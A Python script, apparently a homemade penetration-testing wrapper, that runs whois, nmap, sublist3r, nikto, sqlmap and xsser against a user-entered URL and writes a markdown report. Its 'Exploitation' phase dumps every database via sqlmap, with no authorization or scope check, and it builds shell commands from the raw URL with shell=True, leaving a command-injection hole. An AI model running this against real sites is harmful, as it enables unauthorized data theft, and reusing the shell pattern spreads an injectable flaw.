#!/usr/bin/env python

import os
import subprocess
from datetime import datetime
import pyfiglet
from termcolor import colored

# Utility function to display a banner
def display_banner():
    banner = pyfiglet.figlet_format("Simon's-- AutoScript")
    print(colored(banner, "cyan"))

# Utility function to get user input
def get_target_input():
    target = input("Enter the target URL: ").strip()
    if not target.startswith("http://") and not target.startswith("https://"):
        print(colored("[-] Invalid URL format. Please include 'http://' or 'https://'.", "red"))
        return get_target_input()
    return target

# Utility function to run shell commands and save output
def run_command(command, output_file):
    try:
        print(colored(f"[+] Running: {command}", "cyan"))
        result = subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        with open(output_file, "w") as file:
            file.write(result.stdout + result.stderr)
        print(colored(f"[+] Results saved to {output_file}\n", "green"))
    except Exception as e:
        print(colored(f"[-] Error running command {command}: {e}", "red"))

# Phase 1: Reconnaissance
def reconnaissance(target, output_dir):
    print(colored("=== Phase 1: Reconnaissance ===", "yellow"))
    target_domain = target.replace('http://', '').replace('https://', '')
    run_command(f"whois {target_domain}", f"{output_dir}/whois.txt")
    run_command(f"nmap -sS -Pn -A -oN {output_dir}/nmap.txt {target_domain}", f"{output_dir}/nmap.txt")
    run_command(f"sublist3r -d {target_domain} -o {output_dir}/subdomains.txt", f"{output_dir}/subdomains.txt")

# Phase 2: Vulnerability Scanning
def vulnerability_scanning(target, output_dir):
    print(colored("=== Phase 2: Vulnerability Scanning ===", "yellow"))
    # Run Nikto scan
    nikto_output_file = f"{output_dir}/nikto_scan.txt"
    run_command(f"nikto -h {target} -output {nikto_output_file}", nikto_output_file)
    
    # Run SQLMap scan
    sqlmap_output_dir = f"{output_dir}/sqlmap_results"
    os.makedirs(sqlmap_output_dir, exist_ok=True)
    run_command(f"sqlmap -u \"{target}/page?id=1\" --batch --dbs --output-dir={sqlmap_output_dir}", f"{output_dir}/sqlmap_output.txt")

# Phase 3: Exploitation
def exploitation(target, output_dir):
    print(colored("=== Phase 3: Exploitation ===", "yellow"))
    # Run SQLMap dump
    sqlmap_output_dir = f"{output_dir}/sqlmap_results"
    run_command(f"sqlmap -u \"{target}/page?id=1\" --dump-all --batch --output-dir={sqlmap_output_dir}", f"{output_dir}/sqlmap_dump.txt")
    
    # Run XSSer scan
    xsser_output_file = f"{output_dir}/xsser_output.txt"
    run_command(f"xsser --url {target} --auto --Cw 10 --cw 5 --reverse-check --follow-redirects", xsser_output_file)

# Phase 4: Report Generation
def generate_report(target, output_dir, report_file):
    print(colored("=== Phase 4: Generating Report ===", "yellow"))
    with open(report_file, "w") as report:
        report.write(f"# Security Test Report for {target}\n\n")
        report.write(f"**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        report.write("**Prepared by:** Automated Security Script\n\n")
        report.write("## Executive Summary\n")
        report.write("This report summarizes the findings from the security test on the target.\n\n")
        
        # Include Nmap results
        report.write("## Nmap Results\n")
        try:
            with open(f"{output_dir}/nmap.txt", "r") as nmap_file:
                report.write("\n```\n" + nmap_file.read() + "\n```\n")
        except FileNotFoundError:
            report.write("Nmap results not found.\n")
        
        # Include Nikto results
        report.write("## Nikto Results\n")
        try:
            with open(f"{output_dir}/nikto_scan.txt", "r") as nikto_file:
                report.write("\n```\n" + nikto_file.read() + "\n```\n")
        except FileNotFoundError:
            report.write("Nikto results not found.\n")
        
        # Include SQLmap results
        report.write("## SQLmap Results\n")
        sqlmap_log = f"{output_dir}/sqlmap_results/output.log"
        if os.path.exists(sqlmap_log):
            with open(sqlmap_log, "r") as sqlmap_file:
                report.write("\n```\n" + sqlmap_file.read() + "\n```\n")
        else:
            report.write("No SQL injection vulnerabilities found.\n")
        
        # Include XSSer results
        report.write("## XSSer Results\n")
        try:
            with open(f"{output_dir}/xsser_output.txt", "r") as xsser_file:
                report.write("\n```\n" + xsser_file.read() + "\n```\n")
        except FileNotFoundError:
            report.write("XSSer results not found.\n")
        
        report.write("## Conclusion\n")
        report.write("The test identified potential vulnerabilities. Please address them according to the recommendations provided.\n")
    
    print(colored(f"[+] Report generated: {report_file}\n", "green"))

# Main function to orchestrate the test
def main():
    display_banner()
    print(colored("Starting comprehensive security test...\n", "blue"))

    target = get_target_input()
    output_dir = "security_test_results"
    report_file = "security_report.md"
    
    # Create output directory if it doesn't exist
    os.makedirs(output_dir, exist_ok=True)
    
    # Execute each phase
    reconnaissance(target, output_dir)
    vulnerability_scanning(target, output_dir)
    exploitation(target, output_dir)
    generate_report(target, output_dir, report_file)
    
    print(colored("Security test completed successfully!", "green"))

if __name__ == "__main__":
    main()